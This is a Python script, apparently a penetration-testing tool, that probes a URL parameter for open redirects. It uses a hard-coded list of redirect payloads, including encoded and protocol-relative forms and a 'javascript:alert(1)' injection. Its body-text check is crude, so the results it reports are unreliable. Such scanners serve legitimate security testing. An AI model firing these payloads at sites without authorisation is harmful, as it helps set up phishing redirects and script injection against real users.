#!/usr/bin/env python3
"""
Open Redirect Scanner
Usage: python open_redirect.py https://target.com/redirect?url=
"""

import sys
import requests
import urllib.parse

class OpenRedirectScanner:
    def __init__(self, url):
        self.url = url
        self.findings = []
        
        # Open redirect payloads
        self.payloads = [
            'https://google.com',
            '//google.com',
            '///google.com',
            'https:google.com',
            'https:///google.com',
            '..//google.com',
            '..;/google.com',
            'http://google.com',
            'https://google.com%23',
            'javascript:alert(1)',
            '//test@google.com',
            'http://test.google.com',
            'https://test.google.com/',
            '/%2F../',
            '//%2F..',
            'https://google.com?',
        ]
    
    def test_payload(self, payload):
        """Test open redirect"""
        try:
            parsed = urllib.parse.urlparse(self.url)
            params = urllib.parse.parse_qs(parsed.query)
            
            for key in params:
                params[key] = [payload]
                break
            
            new_query = urllib.parse.urlencode(params, doseq=True)
            new_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
            
            r = requests.get(new_url, timeout=10, allow_redirects=False)
            
            # Check if redirect happened
            if r.status_code in [301, 302, 303, 307, 308]:
                location = r.headers.get('Location', '')
                if 'google' in location or 'javascript' in location:
                    return {'payload': payload, 'redirect': location}
            
            # Check in response body
            r2 = requests.get(new_url, timeout=10)
            if 'google.com' in r2.text:
                return {'payload': payload, 'in_body': True}
            
        except Exception as e:
            pass
        
        return None
    
    def scan(self):
        """Scan for open redirect"""
        print(f"[*] Scanning {self.url}...")
        
        for payload in self.payloads:
            result = self.test_payload(payload)
            if result:
                print(f"[!] Open redirect: {payload}")
                if 'redirect' in result:
                    print(f"    -> {result['redirect']}")
                self.findings.append(result)
        
        return self.findings


def main():
    if len(sys.argv) < 2:
        print("Usage: python open_redirect.py <url>")
        sys.exit(1)
    
    url = sys.argv[1]
    scanner = OpenRedirectScanner(url)
    scanner.scan()


if __name__ == "__main__":
    main()